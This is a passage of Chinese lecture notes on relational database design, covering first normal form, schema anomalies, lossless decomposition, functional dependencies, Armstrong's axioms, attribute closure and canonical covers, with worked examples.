<td>1</td>
<td>张三</td>
<td>数学</td>
<td>物理</td>
</tr>
<tr>
<td>2</td>
<td>李四</td>
<td>语文</td>
<td>历史</td>
</tr>
<tr>
<td>2</td>
<td>李四</td>
<td>地理</td>
<td></td>
</tr>
</tbody>
</table>
<p>也可以使用一个单独的表来表示多值属性：</p>
<table>
<thead>
<tr>
<th>学生ID</th>
<th>课程</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>数学</td>
</tr>
<tr>
<td>1</td>
<td>物理</td>
</tr>
<tr>
<td>2</td>
<td>语文</td>
</tr>
</tbody>
</table>
<p>也可以使用一个新的属性来表示多值属性，合并成同一个字段，但是这种方式实际上在技术上仍然违反了1NF：</p>
<table>
<thead>
<tr>
<th>学生ID</th>
<th>学生姓名</th>
<th>课程表</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>张三</td>
<td>数学, 物理</td>
</tr>
<tr>
<td>2</td>
<td>李四</td>
<td>语文, 历史, 地理</td>
</tr>
</tbody>
</table>
</div>
<p>一个域中的元素是否是原子的，取决于它们在关系中的使用方式。</p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>字符串一般来说会被认为是原子的；</p>
<p>但是如果每个学生被机遇roll number，形如'CS0012'，'EE1127'等，如果前缀被挑选出来，用于标识学生所在的系，那么这个域的元素就不是原子的。</p>
<p>但是这样做是不好的：这导致信息被编码在应用程序中，而不是在数据库中。</p>
</div>
<h2 id="note-db-lec7-pitfalls-in-relational-database-design">Pitfalls in Relational Database Design<a class="headerlink" href="#note-db-lec7-pitfalls-in-relational-database-design" title="Permanent link">&para;</a></h2>
<p>关系数据库要求我们寻找一个好的schema，对于坏的schema，会出现以下问题：</p>
<ul>
<li>数据冗余</li>
<li>更新异常</li>
<li>插入异常</li>
<li>删除异常</li>
<li>表示信息的能力下降</li>
</ul>
<div class="admonition example">
<p class="admonition-title">一个设计不良的表</p>
<table>
<thead>
<tr>
<th>学生ID</th>
<th>学生姓名</th>
<th>系名</th>
<th>系主任</th>
<th>课程编号</th>
<th>课程名称</th>
<th>成绩</th>
</tr>
</thead>
<tbody>
<tr>
<td>101</td>
<td>张三</td>
<td>计算机系</td>
<td>王教授</td>
<td>CS101</td>
<td>数据库原理</td>
<td>85</td>
</tr>
<tr>
<td>101</td>
<td>张三</td>
<td>计算机系</td>
<td>王教授</td>
<td>CS102</td>
<td>计算机网络</td>
<td>92</td>
</tr>
<tr>
<td>102</td>
<td>李四</td>
<td>物理系</td>
<td>刘教授</td>
<td>PH101</td>
<td>力学</td>
<td>78</td>
</tr>
<tr>
<td>103</td>
<td>王五</td>
<td>计算机系</td>
<td>王教授</td>
<td>CS101</td>
<td>数据库原理</td>
<td>91</td>
</tr>
</tbody>
</table>
<p>这个表存在的问题：</p>
<ul>
<li><strong>冗余</strong>：系名和系主任信息在每个学生的多条记录中重复</li>
<li><strong>更新异常</strong>：如果系主任变更，需要更新多行记录</li>
<li><strong>删除异常</strong>：如果删除所有选修某课程的学生记录，课程信息也会丢失</li>
<li><strong>插入异常</strong>：无法添加尚未选课的新生，因为成绩字段无法填写</li>
</ul>
</div>
<ol>
<li>
<p><strong>缺乏适当的范式化</strong>：未能将表分解为合适的范式，导致上述异常问题</p>
</li>
<li>
<p><strong>过度范式化</strong>：将表分解得过于细碎，导致需要大量连接操作，影响查询性能</p>
</li>
<li>
<p><strong>不恰当的主键选择</strong>：</p>
<ul>
<li>使用不稳定的业务属性作为主键</li>
<li>使用过于复杂的复合主键</li>
<li>没有为表定义适当的主键</li>
</ul>
</li>
<li>
<p><strong>糟糕的命名约定</strong>：</p>
<ul>
<li>表名和列名不清晰</li>
<li>不一致的命名风格</li>
<li>使用保留字作为名称</li>
</ul>
</li>
<li>
<p><strong>未恰当使用索引</strong>：</p>
<ul>
<li>索引不足，导致查询性能差</li>
<li>索引过多，影响数据修改操作的性能</li>
</ul>
</li>
<li>
<p><strong>忽视数据完整性约束</strong>：</p>
<ul>
<li>缺少必要的外键约束</li>
<li>缺少检查约束或触发器来维护复杂的数据规则</li>
</ul>
</li>
<li>
<p><strong>不考虑数据增长</strong>：</p>
<ul>
<li>设计未考虑到数据随时间增长的需求</li>
<li>表结构不灵活，难以扩展</li>
</ul>
</li>
</ol>
<h3 id="note-db-lec7-decomposition">Decomposition<a class="headerlink" href="#note-db-lec7-decomposition" title="Permanent link">&para;</a></h3>
<p>一个调整schema的方法叫decomposition，它将一个关系分解为多个关系。</p>
<p>例如将r(ABCD)分解为r1(AB)和r2(BCD)</p>
<p><strong>要求1</strong></p>
<p>如果<span class="arithmatex">\(R_1\)</span>和<span class="arithmatex">\(R_2\)</span>的是由<span class="arithmatex">\(R\)</span>通过decomposition得到的，那么<span class="arithmatex">\(R_1\)</span>和<span class="arithmatex">\(R_2\)</span>的属性并集是<span class="arithmatex">\(R\)</span>的属性</p>
<div class="arithmatex">\[
    R_1 \cup R_2 = R
\]</div>
<p><strong>要求2</strong></p>
<p>无损连接分解(lossless join decomposition)即，对于所有可能的关系<span class="arithmatex">\(r \in R\)</span>，有</p>
<div class="arithmatex">\[
    \pi_{R_1}(r) \bowtie \pi_{R_2}(r) = r
\]</div>
<p>例如<span class="arithmatex">\(R=(A,B),R_1=(A),R_2=(B)\)</span>，那么</p>
<figure>
<img alt="" src="../NOTE/DB/img/lec7-1.png" width="60%" />
</figure>
<blockquote>
<p>没有共同属性时，natural join相当于笛卡尔积</p>
</blockquote>
<p>这种分解是non-lossless的，因为<span class="arithmatex">\(R_1(r) \bowtie R_2(r) \neq r\)</span></p>
<p>总的来说，无损分解要求子关系是原关系的投影，并且子关系通过自然连接可以恢复原关系。</p>
<p>通过decomposition，可以去除冗余。</p>
<h2 id="note-db-lec7-functional-dependencies">Functional Dependencies<a class="headerlink" href="#note-db-lec7-functional-dependencies" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>Let <span class="arithmatex">\(R\)</span> be a relation schema,<span class="arithmatex">\(\alpha\)</span> and <span class="arithmatex">\(\beta\)</span> be attributes of <span class="arithmatex">\(R\)</span>.</p>
<p>The functional dependency 
<span class="arithmatex">\(\alpha \rightarrow \beta\)</span> holds on <span class="arithmatex">\(R\)</span> if and only if for any legal relations <span class="arithmatex">\(r(R)\)</span>, whenever any two tuples <span class="arithmatex">\(t_1\)</span> and <span class="arithmatex">\(t_2\)</span> of <span class="arithmatex">\(r\)</span> agree on the attributes <span class="arithmatex">\(\alpha\)</span>, they also agree on the attributes <span class="arithmatex">\(\beta\)</span>, i.e., </p>
<div class="arithmatex">\[
    t_1[\alpha] = t_2[\alpha] \Rightarrow t_1[\beta] = t_2[\beta]
\]</div>
</div>
<p>简单来说，功能依赖<span class="arithmatex">\(\alpha \rightarrow \beta\)</span>表示：如果我们知道<span class="arithmatex">\(\alpha\)</span>的值，就能唯一确定<span class="arithmatex">\(\beta\)</span>的值。</p>
<p>考虑一个学生选课关系：StudentCourse(学号, 姓名, 年龄, 课程号, 成绩, 学分)</p>
<p>在这个关系中可能存在以下功能依赖：</p>
<ul>
<li>学号 <span class="arithmatex">\(\rightarrow\)</span> 姓名, 年龄</li>
<li>学号, 课程号 <span class="arithmatex">\(\rightarrow\)</span> 成绩</li>
<li>课程号 <span class="arithmatex">\(\rightarrow\)</span> 学分</li>
</ul>
<div class="admonition key-point">
<p class="admonition-title">Functional dependency vs. key</p>
<ul>
<li>
<p>A functional dependency is a generalization of the notion of a key.</p>
</li>
<li>
<p><span class="arithmatex">\(K\)</span> is a superkey of <span class="arithmatex">\(R\)</span> if and only if <span class="arithmatex">\(K \rightarrow R\)</span></p>
</li>
<li>
<p><span class="arithmatex">\(K\)</span> is a candidate key of <span class="arithmatex">\(R\)</span> if and only if <span class="arithmatex">\(K \rightarrow R\)</span> and for no <span class="arithmatex">\(\alpha \subset K\)</span>, <span class="arithmatex">\(\alpha \rightarrow R\)</span></p>
</li>
<li>
<p>Functional dependencies allow us to express constraints that cannot be expressed using keys. </p>
</li>
</ul>
</div>
<h3 id="note-db-lec7-the-use-of-functional-dependencies">The use of functional dependencies<a class="headerlink" href="#note-db-lec7-the-use-of-functional-dependencies" title="Permanent link">&para;</a></h3>
<p>We can use  functional dependencies to: </p>
<ul>
<li>Test relations to see if they are legal under a given set of functional dependencies <span class="arithmatex">\(F\)</span>.<blockquote>
<p>如果r是R的合法关系，那么称r满足F(r satisfies F)。</p>
</blockquote>
</li>
</ul>
<p>例如 <span class="arithmatex">\(r\)</span> 的表如下</p>
<table>
<thead>
<tr>
<th>A</th>
<th>B</th>
<th>C</th>
<th>D</th>
</tr>
</thead>
<tbody>
<tr>
<td>a1</td>
<td>b1</td>
<td>c1</td>
<td>d1</td>
</tr>
<tr>
<td>a1</td>
<td>b2</td>
<td>c1</td>
<td>d2</td>
</tr>
<tr>
<td>a2</td>
<td>b2</td>
<td>c2</td>
<td>d2</td>
</tr>
<tr>
<td>a2</td>
<td>b3</td>
<td>c2</td>
<td>d3</td>
</tr>
<tr>
<td>a3</td>
<td>b3</td>
<td>c2</td>
<td>d4</td>
</tr>
</tbody>
</table>
<p>那么F={A <span class="arithmatex">\(\rightarrow\)</span> C, AB <span class="arithmatex">\(\rightarrow\)</span> D(也可以写为(A,B) <span class="arithmatex">\(\rightarrow\)</span> D),ABC <span class="arithmatex">\(\rightarrow\)</span> D}</p>
<p>但是A <span class="arithmatex">\(\rightarrow\)</span> B不成立;</p>
<ul>
<li>Specify constraints(F) on the set of legal relations--schema<blockquote>
<p>我们说F在R上成立(F holds on R) 如果对于所有可能的合法关系r(R),r满足F。</p>
</blockquote>
</li>
</ul>
<p>在上面那个例子中，我们看到了一个合法的关系，但是它满足F，但是不能仅仅通过一个关系来确定。</p>
<p>容易判别一个r是否满足给定的F;不易判别F是否在R上成立。不能仅由某个r推断出F。R上的函数依赖F, 通常由定义R的语义决定。</p>
<h3 id="note-db-lec7-functional-dependency-types">Functional dependency types<a class="headerlink" href="#note-db-lec7-functional-dependency-types" title="Permanent link">&para;</a></h3>
<ol>
<li>
<p>平凡的功能依赖(trivial functional dependency)：如果<span class="arithmatex">\(Y \subseteq X\)</span>，那么<span class="arithmatex">\(X \rightarrow Y\)</span>是平凡的(trivial)。例如：<span class="arithmatex">\((学号, 姓名) \rightarrow 学号\)</span>。</p>
</li>
<li>
<p>非平凡的功能依赖(non-trivial functional dependency)：如果<span class="arithmatex">\(Y \not\subseteq X\)</span>，那么<span class="arithmatex">\(X \rightarrow Y\)</span>是非平凡的(non-trivial)。例如：<span class="arithmatex">\(学号 \rightarrow 姓名\)</span>。</p>
</li>
<li>
<p>完全功能依赖(fully functional dependency)：如果<span class="arithmatex">\(X \rightarrow Y\)</span>，且对于<span class="arithmatex">\(X\)</span>的任何真子集<span class="arithmatex">\(X'\)</span>，都不存在<span class="arithmatex">\(X' \rightarrow Y\)</span>，则称<span class="arithmatex">\(Y\)</span>完全功能依赖于<span class="arithmatex">\(X\)</span>。</p>
</li>
<li>
<p>部分功能依赖(partial functional dependency)：如果<span class="arithmatex">\(X \rightarrow Y\)</span>，但存在<span class="arithmatex">\(X\)</span>的真子集<span class="arithmatex">\(X'\)</span>，使得<span class="arithmatex">\(X' \rightarrow Y\)</span>，则称<span class="arithmatex">\(Y\)</span>部分功能依赖于<span class="arithmatex">\(X\)</span>。</p>
</li>
</ol>
<h3 id="note-db-lec7-armstrongs-axioms">Armstrong's axioms<a class="headerlink" href="#note-db-lec7-armstrongs-axioms" title="Permanent link">&para;</a></h3>
<p>Armstrong公理是一组用于推导功能依赖的规则：</p>
<ol>
<li>
<p><strong>自反律</strong> (reflexivity)：如果<span class="arithmatex">\(Y \subseteq X\)</span>，则<span class="arithmatex">\(X \rightarrow Y\)</span>（平凡依赖）</p>
</li>
<li>
<p><strong>增广律</strong> (augmentation)：如果<span class="arithmatex">\(X \rightarrow Y\)</span>，则<span class="arithmatex">\(XZ \rightarrow YZ\)</span>,也有<span class="arithmatex">\(XZ \rightarrow Y\)</span>（对于任意属性集<span class="arithmatex">\(Z\)</span>）</p>
</li>
<li>
<p><strong>传递律</strong> (transitivity)：如果<span class="arithmatex">\(X \rightarrow Y\)</span>且<span class="arithmatex">\(Y \rightarrow Z\)</span>，则<span class="arithmatex">\(X \rightarrow Z\)</span></p>
</li>
</ol>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>以上三条定律是</p>
<ul>
<li>Sound：从Armstrong公理推导出的所有功能依赖都是正确的。包对的。</li>
<li>Complete：Armstrong公理可以推导出所有可能的功能依赖。完备的。</li>
</ul>
</div>
<p>从Armstrong公理可以推导出以下规则：</p>
<ol>
<li><strong>合并规则</strong> (union rule)：如果<span class="arithmatex">\(X \rightarrow Y\)</span>且<span class="arithmatex">\(X \rightarrow Z\)</span>，则<span class="arithmatex">\(X \rightarrow YZ\)</span></li>
</ol>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p><span class="arithmatex">\(X \rightarrow Y\)</span>,则两边添加<span class="arithmatex">\(X\)</span>，得到<span class="arithmatex">\(XX \rightarrow XY\)</span>，即<span class="arithmatex">\(X \rightarrow XY\)</span></p>
<p>同理，<span class="arithmatex">\(X \rightarrow Z\)</span>，则两边添加<span class="arithmatex">\(Y\)</span>，得到<span class="arithmatex">\(XY \rightarrow YZ\)</span>，由传递律推导出<span class="arithmatex">\(X \rightarrow YZ\)</span></p>
</div>
<ol>
<li><strong>分解规则</strong> (decomposition rule)：如果<span class="arithmatex">\(X \rightarrow YZ\)</span>，则<span class="arithmatex">\(X \rightarrow Y\)</span>且<span class="arithmatex">\(X \rightarrow Z\)</span> </li>
</ol>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p><span class="arithmatex">\(YZ \rightarrow Y\)</span>，且<span class="arithmatex">\(YZ \rightarrow Z\)</span>，由传递律推导出<span class="arithmatex">\(X \rightarrow Y\)</span>和<span class="arithmatex">\(X \rightarrow Z\)</span></p>
</div>
<ul>
<li><strong>伪传递规则</strong> (pseudo-transitivity rule)：如果<span class="arithmatex">\(X \rightarrow Y\)</span>且<span class="arithmatex">\(WY \rightarrow Z\)</span>，则<span class="arithmatex">\(XW \rightarrow Z\)</span></li>
</ul>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p><span class="arithmatex">\(X \rightarrow Y\)</span>，则<span class="arithmatex">\(XW \rightarrow YW\)</span>，由传递律推导出<span class="arithmatex">\(XW \rightarrow Z\)</span></p>
</div>
<h3 id="note-db-lec7-closure-of-a-set-of-functional-dependencies">Closure of a set of functional dependencies<a class="headerlink" href="#note-db-lec7-closure-of-a-set-of-functional-dependencies" title="Permanent link">&para;</a></h3>
<p>给定一组功能依赖<span class="arithmatex">\(F\)</span>，我们可以使用Armstrong公理推导出所有可能的功能依赖，这个集合称为<span class="arithmatex">\(F\)</span>的闭包，记作<span class="arithmatex">\(F^+\)</span>。</p>
<div class="admonition info">
<p class="admonition-title">How to find <span class="arithmatex">\(F^+\)</span></p>
<p>repeat:</p>
<p>For each functional dependency <span class="arithmatex">\(f \in F^+\)</span></p>
<ul>
<li>
<p>Apply reflexivity and augmentation rules on <span class="arithmatex">\(f\)</span></p>
</li>
<li>
<p>Add the resulting functional dependencies to <span class="arithmatex">\(F^+\)</span></p>
</li>
<li>
<p>For each pair of functional dependencies <span class="arithmatex">\(f_1\)</span> and <span class="arithmatex">\(f_2\)</span> in <span class="arithmatex">\(F^+\)</span></p>
</li>
<li>
<p>If <span class="arithmatex">\(f_1\)</span> and <span class="arithmatex">\(f_2\)</span> can be combined using transitivity</p>
</li>
<li>
<p>Then add the resulting functional dependency to <span class="arithmatex">\(F^+\)</span></p>
</li>
</ul>
<p>Until <span class="arithmatex">\(F^+\)</span> does not change any further </p>
</div>
<h3 id="note-db-lec7-attribute-closure">Attribute closure<a class="headerlink" href="#note-db-lec7-attribute-closure" title="Permanent link">&para;</a></h3>
<p>如何测试属性A是不是R的一个superkey?</p>
<ul>
<li>找到<span class="arithmatex">\(F^+\)</span></li>
<li>检查<span class="arithmatex">\(A \rightarrow B_i \in F^+\)</span></li>
<li>如果<span class="arithmatex">\(\bigcup B_i = R\)</span>，则A是superkey</li>
</ul>
<p>但是<span class="arithmatex">\(F^+\)</span>很难计算，所以需要使用属性闭包。直接计算能被<span class="arithmatex">\(A\)</span>属性确定的属性集合。</p>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>对于属性集<span class="arithmatex">\(X\)</span>，其属性闭包<span class="arithmatex">\(X^+\)</span>是所有被<span class="arithmatex">\(X\)</span>函数确定的属性的集合：</p>
<div class="arithmatex">\[
    X^+ = \{A | X \rightarrow A \ is \ in \ F^+ \}
\]</div>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>给定关系R(A,B,C,D,E)和功能依赖集F = {A → BC, CD → E, B → D, E → A}</p>
<p>求属性集{A}的闭包：</p>
<ol>
<li>初始：{A}+ = {A}</li>
<li>使用A → BC：{A}+ = {A,B,C}</li>
<li>使用B → D：{A}+ = {A,B,C,D}</li>
<li>使用CD → E：{A}+ = {A,B,C,D,E}</li>
</ol>
<p>因此{A}+ = {A,B,C,D,E}</p>
<p>所以A是superkey。</p>
</div>
<div class="admonition info">
<p class="admonition-title">How to find <span class="arithmatex">\(A^+\)</span>?</p>
<p>result = A
while (changes to result):
    for each functional dependency f in F:
        if f.left subset of result:
            result = result union f.right</p>
<p>return result</p>
<p>使用属性闭包可以避免反复使用公理寻找<span class="arithmatex">\(F^+\)</span>。</p>
</div>
<p>There are three kind uses if the atrribute set closure:</p>
<ul>
<li>Test if an attribute is a superkey,查看<span class="arithmatex">\(A^+\)</span>是否等于R</li>
<li>Testing functional dependencies,查看<span class="arithmatex">\(X \rightarrow Y\)</span>是否在<span class="arithmatex">\(F^+\)</span>中，只需要查看<span class="arithmatex">\(Y \subseteq X^+\)</span></li>
<li>Computing closure of F,计算<span class="arithmatex">\(F^+\)</span>，对于每个属性集<span class="arithmatex">\(X\)</span>，计算<span class="arithmatex">\(X^+\)</span>，对于每个<span class="arithmatex">\(Y \subseteq X^+\)</span>，<span class="arithmatex">\(X \rightarrow Y\)</span>在<span class="arithmatex">\(F^+\)</span>中,输出所有的<span class="arithmatex">\(X \rightarrow Y\)</span>组成<span class="arithmatex">\(F^+\)</span></li>
</ul>
<h3 id="note-db-lec7-canonical-cover">Canonical cover<a class="headerlink" href="#note-db-lec7-canonical-cover" title="Permanent link">&para;</a></h3>
<p>DBMS should always check to ensure not violate any Functional Dependency (FD) in F. </p>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>一个关系模式<span class="arithmatex">\(R\)</span>的正则覆盖(canonical cover)是<span class="arithmatex">\(F\)</span>的一个最小超集，满足：</p>
<ul>
<li><span class="arithmatex">\(F\)</span>中的所有函数依赖(FD)都包含在<span class="arithmatex">\(F_c\)</span>中</li>
<li><span class="arithmatex">\(F_c\)</span>中的所有函数依赖都满足<span class="arithmatex">\(F\)</span>中的所有函数依赖</li>
<li><span class="arithmatex">\(F_c\)</span>中左边是唯一的</li>
<li>对于<span class="arithmatex">\(FD \in F_c\)</span>，<span class="arithmatex">\(FD\)</span>不包含无关属性(Extraneous attribute)</li>
</ul>
</div>
<p>将F中的多余属性去掉就得到F的正则覆盖。</p>
<p>对于多余属性，有三种情况</p>
<ul>
<li>FD可从其它FD推导出</li>
</ul>
<p>Eg：</p>
<div class="arithmatex">\[
    F=\{A \rightarrow B, B \rightarrow C, A \rightarrow C\}
\]</div>
<p><span class="arithmatex">\(A \rightarrow C\)</span>可从<span class="arithmatex">\(A \rightarrow B\)</span>和<span class="arithmatex">\(B \rightarrow C\)</span>推导出，所以<span class="arithmatex">\(A \rightarrow C\)</span>是多余的。</p>
<p><span class="arithmatex">\(F_c=\{A \rightarrow B, B \rightarrow C\}\)</span></p>
<ul>
<li>FD中左边是多余的</li>
</ul>
<p>Eg：</p>
<div class="arithmatex">\[
    F=\{A \rightarrow B, B \rightarrow C, AC \rightarrow D\}
\]</div>
<p>由于从前两个可以推导出<span class="arithmatex">\(A \rightarrow C\)</span>，所以<span class="arithmatex">\(A \rightarrow AC \rightarrow D\)</span>,所以属性<span class="arithmatex">\(C\)</span>是多余的。</p>
<p><span class="arithmatex">\(F_c=\{A \rightarrow B, B \rightarrow C, A \rightarrow D\}\)</span></p>
<ul>
<li>FD中右边是多余的</li>
</ul>
<p>Eg：</p>
<div class="arithmatex">\[
    F=\{A \rightarrow B, B \rightarrow C, A \rightarrow CD\}
\]</div>
<p><span class="arithmatex">\(C\)</span>是多余的，因为<span class="arithmatex">\(A \rightarrow CD\)</span>可以写为<span class="arithmatex">\(A \rightarrow C\)</span>和<span class="arithmatex">\(A \rightarrow D\)</span>，而<span class="arithmatex">\(A \rightarrow C\)</span>已经可以由前两条推出<span class="arithmatex">\(F\)</span>。</p>
<p><span class="arithmatex">\(F_c=\{A \rightarrow B, B \rightarrow C, A \rightarrow D\}\)</span></p>
<h4 id="note-db-lec7-judging-extraneous-attributes">Judging Extraneous Attributes<a class="headerlink" href="#note-db-lec7-judging-extraneous-attributes" title="Permanent link">&para;</a></h4>
<p>在寻找正则覆盖时，需要识别和移除多余属性。多余属性的判定可以分为以下两种情况：</p>
<p>对于函数依赖 <span class="arithmatex">\(\alpha \rightarrow \beta\)</span> 在 <span class="arithmatex">\(F\)</span> 中：</p>
<ul>
<li><strong>左侧多余属性</strong></li>
</ul>
<p>如果属性 <span class="arithmatex">\(A \in \alpha\)</span>，且 <span class="arithmatex">\(F\)</span> 逻辑上等价于 <span class="arithmatex">\(F' = (F - \{\alpha \rightarrow \beta\}) \cup \{(\alpha - A) \rightarrow \beta\}\)</span>，则 <span class="arithmatex">\(A\)</span> 在 <span class="arithmatex">\(\alpha\)</span> 中是多余的。</p>
<p>也就是说，如果移除了 <span class="arithmatex">\(A\)</span> 后的函数依赖仍能推导出相同的约束，则 <span class="arithmatex">\(A\)</span> 是多余的。</p>
<p><strong>例如</strong>：</p>
<ul>
<li><span class="arithmatex">\(\alpha = \{A\alpha'\}\)</span>，<span class="arithmatex">\(\{A\alpha'\} \rightarrow \beta\)</span>。若 <span class="arithmatex">\(F\)</span> 蕴涵 <span class="arithmatex">\(\alpha' \rightarrow \beta\)</span>，则 <span class="arithmatex">\(\{A\alpha'\} \rightarrow \beta\)</span> 多余，即 <span class="arithmatex">\(A\)</span> 多余。</li>
<li>给定 <span class="arithmatex">\(F = \{A \rightarrow C, AB \rightarrow C\}\)</span>
  因为 <span class="arithmatex">\(F = \{A \rightarrow C, AB \rightarrow C\}\)</span> 逻辑上蕴涵 <span class="arithmatex">\(A \rightarrow C\)</span>，所以 <span class="arithmatex">\(B\)</span> 在 <span class="arithmatex">\(AB \rightarrow C\)</span> 中是多余的，
  <span class="arithmatex">\(F' = \{A \rightarrow C, A \rightarrow C\} = \{A \rightarrow C\}\)</span></li>
</ul>
<div class="admonition info">
<p class="admonition-title">testing</p>
<p>testing if A is extraneous in <span class="arithmatex">\(\alpha\)</span></p>
<p>Compute <span class="arithmatex">\((\alpha - A)^+\)</span> using F</p>
<p>If <span class="arithmatex">\((\alpha - A)^+\)</span> contains <span class="arithmatex">\(\beta\)</span>, then A is extraneous in <span class="arithmatex">\(\alpha\)</span></p>
<p>在原属性下移除A后，新的属性集能推出原来的FD，则A是多余的，因为不需要A参与左侧也能推出右侧。</p>
</div>
<ul>
<li><strong>右侧多余属性</strong></li>
</ul>
<p>如果属性 <span class="arithmatex">\(A \in \beta\)</span>，且函数依赖集 <span class="arithmatex">\(F' = (F - \{\alpha \rightarrow \beta\}) \cup \{\alpha \rightarrow (\beta - A)\}\)</span> 逻辑上蕴涵 <span class="arithmatex">\(F\)</span>，则 <span class="arithmatex">\(A\)</span> 在 <span class="arithmatex">\(\beta\)</span> 中是多余的。</p>
<p><strong>例如</strong>：</p>
<ul>
<li><span class="arithmatex">\(\beta = \{A\beta'\}\)</span>, <span class="arithmatex">\(\alpha \rightarrow \{A\beta'\}\)</span>，有 <span class="arithmatex">\(\{\alpha \rightarrow A, \alpha \rightarrow \beta\}\)</span>。若 <span class="arithmatex">\(F'\)</span> 蕴涵 <span class="arithmatex">\(\alpha \rightarrow A\)</span>，则 <span class="arithmatex">\(\alpha \rightarrow A\)</span> 多余（即可用 <span class="arithmatex">\(F'\)</span> 代替 <span class="arithmatex">\(F\)</span>）。</li>
<li>给定 <span class="arithmatex">\(F = \{A \rightarrow C, AB \rightarrow CD\}\)</span>
  由于 <span class="arithmatex">\(AB \rightarrow CD \Rightarrow \{AB \rightarrow C, AB \rightarrow D\}\)</span>，且 <span class="arithmatex">\(AB \rightarrow C\)</span> 可以从 <span class="arithmatex">\(F' = \{A \rightarrow C, AB \rightarrow D\}\)</span> 推导出，
  因此 <span class="arithmatex">\(C\)</span> 在 <span class="arithmatex">\(AB \rightarrow CD\)</span> 中是多余的。</li>
</ul>
<div class="admonition info">
<p class="admonition-title">testing</p>
<p>testing if A is extraneous in <span class="arithmatex">\(\beta\)</span></p>
<p>Compute <span class="arithmatex">\(\alpha^+\)</span> using <span class="arithmatex">\(F'\)</span></p>
<p>where <span class="arithmatex">\(F' = (F - \{\alpha \rightarrow \beta\}) \cup \{\alpha \rightarrow (\beta - A)\}\)</span></p>
<p>If <span class="arithmatex">\(\alpha^+\)</span> contains A, then A is extraneous in <span class="arithmatex">\(\beta\)</span></p>
<p>在移除了包含可疑属性FD的新的F中，如果仍能推出A，则A是多余的。
因为A已经蕴含在新的F中。</p>
</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>将包含可疑的多余属性的FD从F中去掉之后，再加上去掉多余属性的FD，得到新的F'，如果F'与F等价，则去掉的可疑属性确实是多余的。</p>
</div>
<h4 id="note-db-lec7-computing-canonical-cover">Computing canonical cover<a class="headerlink" href="#note-db-lec7-computing-canonical-cover" title="Permanent link">&para;</a></h4>
<p>要计算函数依赖集F的规范覆盖，需要执行以下步骤：</p>
<p><strong>重复执行以下操作</strong>：</p>
<ul>
<li>使用合并规则，将<span class="arithmatex">\(F\)</span>中形如 <span class="arithmatex">\(\alpha_1 \rightarrow \beta_1\)</span> 和 <span class="arithmatex">\(\alpha_1 \rightarrow \beta_2\)</span> 的依赖替换为 <span class="arithmatex">\(\alpha_1 \rightarrow \beta_1\beta_2\)</span></li>
<li>查找具有多余属性的函数依赖 <span class="arithmatex">\(\alpha \rightarrow \beta\)</span>（多余属性可能出现在<span class="arithmatex">\(\alpha\)</span>或<span class="arithmatex">\(\beta\)</span>中）</li>
<li>如果发现多余属性，则从 <span class="arithmatex">\(\alpha \rightarrow \beta\)</span> 中删除该属性</li>
</ul>
<p><strong>直到F不再变化为止</strong></p>
<p><strong>注意</strong>：当某些多余属性被删除后，合并规则可能变得适用，因此需要重新应用合并规则。</p>
<h2 id="note-db-lec7-decomposition_1">Decomposition<a class="headerlink" href="#note-db-lec7-decomposition_1" title="Permanent link">&para;</a></h2>
<div class="admonition note">
<p class="admonition-title">Goals of Normalization</p>
<p>judge whether a particular relation is in a good form,i.e.,</p>
<ul>
<li>No redundant</li>
<li>No insert ,delete ,update anomalies</li>
</ul>
<p>In the case that a relationm is not in a good form,we decompose it into a set
of relations that：</p>
<ul>
<li>The decomposition is a lossless-join decomposition(无损连接分解).</li>
<li>The decomposition is dependency preservation(依赖保持).</li>
<li>Each relation Ri is in a good form(BCNF or 3NF)</li>
</ul>
</div>
<h3 id="note-db-lec7-desirable-properties-of-a-decomposition">Desirable properties of a decomposition<a class="headerlink" href="#note-db-lec7-desirable-properties-of-a-decomposition" title="Permanent link">&para;</a></h3>
<ul>
<li>子关系属性的并必须覆盖原属性</li>
<li>子关系必须是无损连接的,对于一分为二的分解，分解后的两个子模式的共同属性必须是R1或者R2</li>
<li>
<p>子关系必须保持函数依赖(Dependency preserving)</p>
</li>
<li>
<p>为了高效地检查更新（确保不违反任何FD），允许在子关系<span class="arithmatex">\(R_i\)</span>中分别进行更新验证，而无需执行它们的连接操作。</p>
</li>
<li>
<p>F对<span class="arithmatex">\(R_i\)</span>的限制是：<span class="arithmatex">\(F_i \subseteq F^+\)</span>；<span class="arithmatex">\(F_i\)</span>只包含<span class="arithmatex">\(R_i\)</span>的属性。</p>
</li>
<li>
<p><span class="arithmatex">\((F_1 \cup F_2 \cup ... \cup F_n)^+ = F^+\)</span>，其中<span class="arithmatex">\(F_i\)</span>是包含在<span class="arithmatex">\(F^+\)</span>中且只包含<span class="arithmatex">\(R_i\)</span>属性的依赖集。</p>
</li>
<li>
<p>子关系必须满足一定的范式.Boyce-Codd范式（BCNF）或第三范式（3NF）。</p>
</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>R(A,B,C),F={A <span class="arithmatex">\(\rightarrow\)</span> B,B <span class="arithmatex">\(\rightarrow\)</span> C}</p>
<p>分解为R1(A,B),R2(B,C)</p>
<ul>
<li>无损分解验证：</li>
</ul>
<div class="arithmatex">\[
    R1 \cap R2 = B
\]</div>
<p>而<span class="arithmatex">\(B^+ = \{B,C\}\)</span>，所以<span class="arithmatex">\(B\)</span>是<span class="arithmatex">\(R_2\)</span>的Key，所以<span class="arithmatex">\(R_1\)</span>和<span class="arithmatex">\(R_2\)</span>是无损分解</p>
<ul>
<li>依赖保持验证：</li>
</ul>
<div class="arithmatex">\[
    F1 = \{A \rightarrow B\}
\]</div>
<div class="arithmatex">\[
    F2 = \{B \rightarrow C\}
\]</div>
<div class="arithmatex">\[
    F1 \cup F2 = \{A \rightarrow B, B \rightarrow C\}
\]</div>
<div class="arithmatex">\[
    (F1 \cup F2)^+ = \{A \rightarrow B, B \rightarrow C\}=F
\]</div>
<p>所以正确</p>
<p>若是分解为R1(A,B),R2(A,C)</p>
